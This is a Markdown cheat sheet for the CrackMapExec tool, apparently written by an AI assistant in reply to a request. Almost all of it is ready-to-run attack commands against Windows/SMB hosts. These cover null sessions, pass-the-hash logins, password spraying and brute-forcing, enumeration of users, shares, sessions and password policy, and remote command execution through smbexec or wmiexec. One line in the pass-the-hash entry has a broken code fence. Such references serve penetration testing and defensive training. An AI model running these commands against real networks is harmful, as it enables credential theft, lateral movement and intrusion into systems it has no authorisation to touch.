Here's a Markdown-formatted cheat sheet for CrackMapExec (CME), covering various scenarios and commands:

# CrackMapExec (CME) Cheat Sheet

## General Help

- Display general help:  
```bash
  crackmapexec --help
```
- Display help for a specific protocol (e.g., SMB):
```bash
  crackmapexec smb --help
```
## Target Specification

- Single host:
```bash
  crackmapexec smb 192.168.1.10
```
- Multiple hosts:
```bash
  crackmapexec smb 192.168.1.10 192.168.1.11
```
- CIDR notation:
```bash
  crackmapexec smb 192.168.1.0/24
```
- IP range:
```bash
  crackmapexec smb 192.168.1.10-20
```
- From a file:
```bash
  crackmapexec smb targets.txt
```
## Authentication
- Null session:
```bash
  crackmapexec smb 192.168.1.10 -u '' -p ''
```
- Authenticate with username and password:
```bash
  crackmapexec smb 192.168.1.10 -u 'username' -p 'password'
```
- Authenticate with NTLM hash (  ```
Pass-the-Hash):
```bash
  crackmapexec smb 192.168.1.10 -u 'username' -H 'LMHASH:NTHASH'
```
- Use Kerberos authentication:
```bash
  crackmapexec smb 192.168.1.10 -u 'username' -p 'password' -k
```
- Local authentication:
```bash
  crackmapexec smb 192.168.1.10 -u 'Administrator' -p 'password' --local-auth
```
## Password Spraying and Brute-Forcing
- Single user, multiple passwords:
```bash
  crackmapexec smb 192.168.1.0/24 -u 'admin' -p 'password1' 'password2'
```
- Multiple users, single password:
```bash
  crackmapexec smb 192.168.1.0/24 -u 'user1' 'user2' -p 'P@ssword'
```
- From files:
```bash
  crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
```
- Continue on success:
```bash
  crackmapexec smb 192.168.1.0/24 -u users.txt -p 'password' --continue-on-success
```
## Enumeration
- Enumerate users:
```bash
  crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --users
```
- RID brute-force to enumerate users:
```bash
  crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --rid-brute
```
- Enumerate groups:
```bash
  crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --groups
```
- Enumerate shares:
```bash
  crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --shares
```
- Enumerate sessions:
```bash
  crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sessions
```
- Enumerate logged-on users:
```bash
  crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --loggedon-users
```
- Enumerate password policy:
```bash
  crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --pass-pol
```
## Command Execution
- Execute command via SMB (requires admin privileges):  
```bash
  crackmapexec smb 192.168.1.10 -u 'Administrator' -p 'password' -x 'whoami'
```
- Execute PowerShell command:
```bash
  crackmapexec smb 192.168.1.10 -u 'Administrator' -p 'password' -X 'whoami'
```
- Specify execution method (e.g., smbexec, wmiexec, atexec):
```bash
  crackmapexec smb 192.168.1.10 -u 'Administrator' -p 'password' -x 'whoami' --exec-method wmiexec
```